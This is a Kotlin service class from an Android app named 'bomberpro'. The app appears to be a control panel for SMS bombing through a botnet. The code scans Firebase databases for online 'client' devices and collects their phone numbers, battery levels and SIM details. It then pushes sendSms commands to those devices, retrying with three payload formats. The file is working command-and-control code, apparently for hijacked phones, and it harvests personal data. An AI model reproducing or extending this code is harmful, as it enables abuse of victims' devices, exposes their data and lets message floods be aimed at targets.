package com.sanji.bomberpro.services

import com.google.firebase.firestore.FirebaseFirestore
import com.sanji.bomberpro.FirebaseConfig
import com.sanji.bomberpro.data.FirebaseNode
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

data class Device(
    val firebaseUrl: String,
    val firebaseLabel: String,
    val deviceId: String,
    val deviceName: String,
    val phone: String?,
    val battery: Int?,
    val sims: List<Map<String, Any?>>,
    val shortId: String,
    val lastSeen: Long,
)

data class SendResult(
    val ok: Boolean,
    val deviceId: String,
    val firebaseUrl: String,
    val error: String? = null,
)

class RealtimeDbService {

    private val http: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(8, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .build()

    private val jsonMedia = "application/json; charset=utf-8".toMediaType()

    // ---------- Firebases from Firestore ----------

    suspend fun loadFirebases(): List<FirebaseNode> = withContext(Dispatchers.IO) {
        try {
            val snap = FirebaseFirestore.getInstance()
                .collection(FirebaseConfig.COL_FIREBASES)
                .get()
                .await()

            val list = snap.documents.mapNotNull { doc ->
                val url = doc.getString("url") ?: return@mapNotNull null
                if (url.isBlank()) return@mapNotNull null
                FirebaseNode(
                    id = doc.id,
                    url = url,
                    label = doc.getString("label") ?: "Firebase",
                    enabled = doc.getBoolean("enabled") ?: true,
                )
            }.filter { it.enabled }

            if (list.isNotEmpty()) list
            else FirebaseConfig.DEFAULT_RTDB_URLS.mapIndexed { i, u ->
                FirebaseNode(id = "default_$i", url = u, label = "Firebase ${i + 1}", enabled = true)
            }
        } catch (e: Exception) {
            FirebaseConfig.DEFAULT_RTDB_URLS.mapIndexed { i, u ->
                FirebaseNode(id = "default_$i", url = u, label = "Firebase ${i + 1}", enabled = true)
            }
        }
    }

    // ---------- Scan ----------

    suspend fun scanAll(firebases: List<FirebaseNode>): List<Device> = withContext(Dispatchers.IO) {
        coroutineScope {
            firebases.map { fb -> async { scanFirebase(fb) } }.awaitAll().flatten()
        }
    }

    private suspend fun scanFirebase(fb: FirebaseNode): List<Device> {
        val out = mutableListOf<Device>()
        try {
            val url = fb.url.trimEnd('/') + FirebaseConfig.RTDB_CLIENTS
            val req = Request.Builder().url(url).get().build()
            http.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return emptyList()
                val body = resp.body?.string() ?: return emptyList()
                if (body.isBlank() || body == "null") return emptyList()

                val json = JSONObject(body)
                val ids = json.keys()

                val tasks = mutableListOf<Device>()
                while (ids.hasNext()) {
                    val devId = ids.next()
                    val dev = fetchDevice(fb, devId)
                    if (dev != null) tasks.add(dev)
                }
                out.addAll(tasks)
            }
        } catch (_: Exception) {
            // silent
        }
        return out
    }

    private fun fetchDevice(fb: FirebaseNode, devId: String): Device? {
        return try {
            val url = fb.url.trimEnd('/') + "/clients/$devId.json"
            val req = Request.Builder().url(url).get().build()
            http.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return null
                val body = resp.body?.string() ?: return null
                if (body.isBlank() || body == "null") return null
                val obj = JSONObject(body)

                if (!isOnline(obj)) return null

                Device(
                    firebaseUrl = fb.url,
                    firebaseLabel = fb.label,
                    deviceId = devId,
                    deviceName = obj.optString("deviceName", obj.optString("name", "device")),
                    phone = obj.optString("phone", obj.optString("phoneNumber", null)),
                    battery = obj.optInt("battery", -1).takeIf { it in 0..100 },
                    sims = parseSims(obj),
                    shortId = shortCode(devId),
                    lastSeen = System.currentTimeMillis() / 1000L,
                )
            }
        } catch (_: Exception) {
            null
        }
    }

    private fun isOnline(obj: JSONObject): Boolean {
        if (obj.optBoolean("isOnline", false)) return true
        if (obj.optBoolean("online", false)) return true
        val st = obj.optString("status", "")
        if (st.equals("online", true) || st.equals("active", true)) return true
        val lastSeen = obj.optLong("lastSeen", 0L)
        val sec = if (lastSeen > 10_000_000_000L) lastSeen / 1000L else lastSeen
        if (sec > 0 && System.currentTimeMillis() / 1000L - sec < 60) return true
        return false
    }

    private fun parseSims(obj: JSONObject): List<Map<String, Any?>> {
        val sims = obj.optJSONArray("sims") ?: obj.optJSONArray("sim") ?: return emptyList()
        val out = mutableListOf<Map<String, Any?>>()
        for (i in 0 until sims.length()) {
            val s = sims.optJSONObject(i) ?: continue
            out.add(
                mapOf(
                    "simSlotIndex" to s.optInt("simSlotIndex", 0),
                    "phoneNumber" to s.optString("phoneNumber", null),
                )
            )
        }
        return out
    }

    private fun shortCode(devId: String): String {
        return if (devId.length <= 8) devId else "${devId.take(4)}…${devId.takeLast(4)}"
    }

    // ---------- Send SMS (3 attempts, bot.py parity) ----------

    suspend fun sendSms(
        firebaseUrl: String,
        deviceId: String,
        simSlot: Int,
        to: String,
        message: String,
    ): SendResult = withContext(Dispatchers.IO) {
        val ts = System.currentTimeMillis() / 1000L

        val attempts = listOf(
            Pair(
                "/clients/$deviceId/webhookEvent/sendSms.json",
                """{"from":$simSlot,"to":"$to","message":${escapeJson(message)},"isSended":false,"timestamp":$ts}"""
            ),
            Pair(
                "/clients/$deviceId/webhookEvent/sendSms.json",
                """{"from":"$simSlot","to":"$to","message":${escapeJson(message)},"isSended":false,"timestamp":$ts}"""
            ),
            Pair(
                "/clients/$deviceId/messages.json",
                """{"phone":"$to","text":${escapeJson(message)},"sim":$simSlot,"timestamp":$ts}"""
            ),
        )

        for ((path, body) in attempts) {
            try {
                val url = firebaseUrl.trimEnd('/') + path
                val req = Request.Builder()
                    .url(url)
                    .put(body.toRequestBody(jsonMedia))
                    .build()

                http.newCall(req).execute().use { resp ->
                    if (resp.isSuccessful) {
                        return@withContext SendResult(
                            ok = true,
                            deviceId = deviceId,
                            firebaseUrl = firebaseUrl,
                        )
                    }
                }
            } catch (_: Exception) {
                // try next attempt
            }
        }

        SendResult(
            ok = false,
            deviceId = deviceId,
            firebaseUrl = firebaseUrl,
            error = "all attempts failed",
        )
    }

    private fun escapeJson(s: String): String {
        return JSONObject.quote(s)
    }
}